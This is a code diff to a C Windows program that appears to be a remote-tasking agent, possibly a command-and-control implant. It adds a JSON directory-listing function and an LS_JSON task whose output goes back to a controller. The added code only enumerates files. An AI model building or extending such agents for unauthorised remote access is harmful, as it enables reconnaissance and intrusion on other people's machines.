@@ -121,6 +121,97 @@ static char* do_ls(const char *path) {
     return buf;
 }
 
+static void escape_json_str(char *out, size_t outsz, const char *in) {
+    size_t o = 0;
+    for (size_t i = 0; in[i] && o + 3 < outsz; i++) {
+        if      (in[i] == '\\') { out[o++] = '\\'; out[o++] = '\\'; }
+        else if (in[i] == '"')  { out[o++] = '\\'; out[o++] = '"'; }
+        else                     { out[o++] = in[i]; }
+    }
+    out[o] = '\0';
+}
+
+static char* do_ls_json(const char *path) {
+    char dir[MAX_PATH];
+    if (!path || !path[0]) {
+        GetCurrentDirectoryA(sizeof(dir), dir);
+    } else {
+        char abs[MAX_PATH];
+        if (GetFullPathNameA(path, sizeof(abs), abs, NULL))
+            strncpy(dir, abs, sizeof(dir) - 1);
+        else
+            strncpy(dir, path, sizeof(dir) - 1);
+        dir[sizeof(dir) - 1] = '\0';
+    }
+
+    char cwd[MAX_PATH];
+    GetCurrentDirectoryA(sizeof(cwd), cwd);
+
+    char pattern[MAX_PATH];
+    snprintf(pattern, sizeof(pattern), "%s\\*", dir);
+
+    WIN32_FIND_DATAA fd;
+    HANDLE h = FindFirstFileA(pattern, &fd);
+
+    char cwd_esc[MAX_PATH * 2], dir_esc[MAX_PATH * 2];
+    escape_json_str(cwd_esc, sizeof(cwd_esc), cwd);
+    escape_json_str(dir_esc, sizeof(dir_esc), dir);
+
+    size_t cap = 16384, len = 0;
+    char *buf = (char*)malloc(cap);
+    if (!buf) return strdup("{\"error\":\"oom\"}");
+
+    len = (size_t)snprintf(buf, cap, "{\"cwd\":\"%s\",\"path\":\"%s\",\"entries\":[",
+                           cwd_esc, dir_esc);
+
+    if (h == INVALID_HANDLE_VALUE) {
+        snprintf(buf + len, cap - len, "]}");
+        return buf;
+    }
+
+    int first = 1;
+    do {
+        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
+            continue;
+
+        int is_dir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? 1 : 0;
+        ULONGLONG sz = ((ULONGLONG)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
+
+        SYSTEMTIME st;
+        FileTimeToSystemTime(&fd.ftLastWriteTime, &st);
+        char mod[32];
+        snprintf(mod, sizeof(mod), "%04d-%02d-%02d %02d:%02d",
+                 st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);
+
+        char name_esc[MAX_PATH * 2];
+        escape_json_str(name_esc, sizeof(name_esc), fd.cFileName);
+
+        char entry[MAX_PATH * 3];
+        int elen = snprintf(entry, sizeof(entry),
+                            "%s{\"name\":\"%s\",\"is_dir\":%s,\"size\":%llu,\"mod\":\"%s\"}",
+                            first ? "" : ",",
+                            name_esc,
+                            is_dir ? "true" : "false",
+                            (unsigned long long)sz,
+                            mod);
+        first = 0;
+
+        if (len + (size_t)elen + 4 >= cap) {
+            cap = len + (size_t)elen + 4096;
+            char *nb = (char*)realloc(buf, cap);
+            if (!nb) break;
+            buf = nb;
+        }
+        memcpy(buf + len, entry, (size_t)elen);
+        len += (size_t)elen;
+    } while (FindNextFileA(h, &fd));
+
+    FindClose(h);
+    if (len + 3 >= cap) { char *nb = (char*)realloc(buf, len + 4); if (nb) buf = nb; }
+    buf[len++] = ']'; buf[len++] = '}'; buf[len] = '\0';
+    return buf;
+}
+
 // ── Sysinfo ───────────────────────────────────────────────────────────────────
 
 static char* do_sysinfo(void) {
@@ -412,6 +503,11 @@ void dispatch_task(AgentTask *task) {
     }
     else if (strcmp(type_upper, "LS") == 0) {
         char *out = do_ls(args);
+        agent_send_result(task->id, out, "");
+        free(out);
+    }
+    else if (strcmp(type_upper, "LS_JSON") == 0) {
+        char *out = do_ls_json(args);
         agent_send_result(task->id, out, "");
         free(out);
     }
